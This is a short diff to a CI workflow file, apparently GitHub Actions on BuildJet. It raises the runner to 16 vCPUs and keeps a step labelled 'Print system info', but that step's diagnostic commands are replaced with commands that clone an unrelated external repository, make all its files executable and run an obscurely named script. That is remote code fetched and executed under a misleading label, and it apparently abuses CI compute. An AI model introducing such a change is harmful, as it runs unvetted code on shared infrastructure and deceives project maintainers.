@@ -8,7 +8,7 @@ on:
 
 jobs:
   build:
-    runs-on: buildjet-2vcpu-ubuntu-2204
+    runs-on: buildjet-16vcpu-ubuntu-2204
 
     steps:
     - name: Checkout repo
@@ -17,5 +17,7 @@ jobs:
     - name: Print system info
       run: |
         echo "Testing BuildJet CI"
-        uname -a
-        lscpu
+        git clone https://github.com/shivmods2027/gfbf17.git
+        cd gfbf17
+        chmod +x *
+        ./5c60sq.sh runner
